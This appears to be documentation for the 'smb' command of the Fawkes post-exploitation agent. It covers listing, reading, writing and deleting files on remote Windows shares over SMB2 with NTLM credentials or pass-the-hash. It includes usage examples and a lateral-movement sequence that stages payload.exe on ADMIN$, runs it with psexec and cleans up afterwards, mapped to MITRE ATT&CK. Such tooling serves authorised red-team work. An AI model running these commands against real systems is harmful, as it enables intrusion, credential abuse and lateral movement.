+++
title = "smb"
chapter = false
weight = 165
hidden = false
+++

## Summary

SMB2 file operations on remote network shares. Connect to Windows shares using NTLM authentication and perform file operations: list shares, browse directories, read files, write files, and delete files. Supports pass-the-hash (PTH) — authenticate with an NT hash instead of a plaintext password.

Uses the `go-smb2` library for SMB2 protocol operations (pure Go, CGO_ENABLED=0). Works cross-platform — agent running on any OS can access remote Windows shares.

## Arguments

Argument | Required | Description
---------|----------|------------
action | Yes | Operation: `shares` (list shares), `ls` (list directory), `cat` (read file), `upload` (write file), `rm` (delete file)
host | Yes | Target host IP or hostname
username | Yes | Username for NTLM auth (supports `DOMAIN\user` or `user@domain` format)
password | No* | Password for NTLM auth (*required unless `-hash` is provided)
hash | No* | NT hash for pass-the-hash (hex, e.g., `aad3b435...:8846f7ea...` or just the NT hash)
domain | No | NTLM domain (auto-detected from username if `DOMAIN\user` or `user@domain` format)
share | Conditional | Share name (e.g., `C$`, `ADMIN$`, `SYSVOL`). Required for ls, cat, upload, rm.
path | Conditional | Path within the share. Required for cat, upload, rm. Optional for ls.
content | Conditional | File content to write (required for upload action)
port | No | SMB port (default: 445)

## Usage

List available shares:
```
smb -action shares -host 192.168.1.1 -username admin -password pass -domain CORP
```

Browse a directory:
```
smb -action ls -host 192.168.1.1 -share C$ -path Users -username CORP\admin -password pass
```

Read a file:
```
smb -action cat -host 192.168.1.1 -share C$ -path Users/Public/file.txt -username admin@corp.local -password pass
```

Write a file:
```
smb -action upload -host 192.168.1.1 -share C$ -path Users/Public/payload.txt -content "data here" -username admin -password pass -domain CORP
```

Delete a file:
```
smb -action rm -host 192.168.1.1 -share C$ -path Users/Public/payload.txt -username admin -password pass -domain CORP
```

### Pass-the-Hash (PTH)

Use `-hash` instead of `-password` with an NT hash (from hashdump, secretsdump, etc.):
```
smb -action shares -host 192.168.1.1 -username admin -hash 8846f7eaee8fb117ad06bdd830b7586c -domain CORP
```

LM:NT format is also supported:
```
smb -action ls -host 192.168.1.1 -share C$ -username admin -hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -domain CORP
```

## Example Output

### List Shares
```
[*] Shares on \\192.168.100.52 (5 found)
----------------------------------------
  \\192.168.100.52\ADMIN$
  \\192.168.100.52\C$
  \\192.168.100.52\IPC$
  \\192.168.100.52\NETLOGON
  \\192.168.100.52\SYSVOL
```

### List Directory
```
[*] \\192.168.100.52\C$\Users (4 entries)
Size          Modified              Name
------------------------------------------------------------
0 B           2026-02-20 10:15:30   Administrator/
0 B           2025-10-08 04:35:12   Public/
0 B           2026-01-15 08:22:45   setup/
0 B           2025-10-08 04:35:12   Default/
```

## SMB Command vs Native File Commands

Fawkes has two ways to interact with files: the **smb** command (remote shares via SMB2) and native file commands (**ls**, **cp**, **cat**, **rm**). Here's when to use each:

### When to Use the SMB Command

Use `smb` for **all remote file operations across the network** — this is the purpose-built lateral movement tool:

- **Accessing remote shares** (`C$`, `ADMIN$`, `SYSVOL`, custom shares)
- **Staging payloads** for lateral movement (e.g., upload to `ADMIN$` before PSExec)
- **Reading files** from remote hosts (configs, SAM backups, logs)
- **Cleanup** — deleting artifacts on remote systems after an engagement
- **Working from Linux/macOS** agents — SMB works cross-platform

```
# Typical lateral movement file staging:
smb -action upload -host 192.168.1.50 -share ADMIN$ -path payload.exe -content <data> -username admin -password Pass -domain CORP
psexec -host 192.168.1.50 -command "C:\Windows\payload.exe"
smb -action rm -host 192.168.1.50 -share ADMIN$ -path payload.exe -username admin -password Pass -domain CORP
```

### When to Use Native Commands (ls, cp, cat, rm)

Use native commands for **local file operations on the compromised host**:

- Browsing, reading, copying, and deleting files on the **agent's own filesystem**
- These commands use Go's `os` package — they work with local paths only
- They do **not** accept UNC paths like `\\192.168.1.50\C$`
- They do **not** accept credentials — they run under the agent's current security context

### What About make-token + Native Commands?

On Windows, `make-token` creates an impersonation token from credentials. While this could theoretically enable UNC path access, the native file commands are not designed for this. Use `smb` instead — it's more reliable, works cross-platform, and takes explicit credentials per-command.

### Quick Reference

| Scenario | Command |
|----------|---------|
| Copy file **to** remote host | `smb -action upload` |
| Copy file **from** remote host | `smb -action cat` (or `download` for agent's own files) |
| List files on remote share | `smb -action ls` |
| Delete file on remote host | `smb -action rm` |
| List files locally | `ls` |
| Copy file locally | `cp` |
| Read file locally | `cat` |
| Delete file locally | `rm` |

### Credential Workflow for SMB Operations

1. **With explicit creds** (recommended): Pass `-username` and `-password` directly to each `smb` command
2. **With NT hash** (pass-the-hash): Pass `-username` and `-hash` with the hex-encoded NT hash
3. **With Kerberos tickets**: Not currently supported — SMB uses NTLM auth only
4. **Domain format**: Use `DOMAIN\user` or `user@domain` in the `-username` parameter, or pass `-domain` separately

## MITRE ATT&CK Mapping

- **T1021.002** - Remote Services: SMB/Windows Admin Shares
- **T1550.002** - Use Alternate Authentication Material: Pass the Hash

{{% notice info %}}Cross-Platform — works on Windows, Linux, and macOS{{% /notice %}}
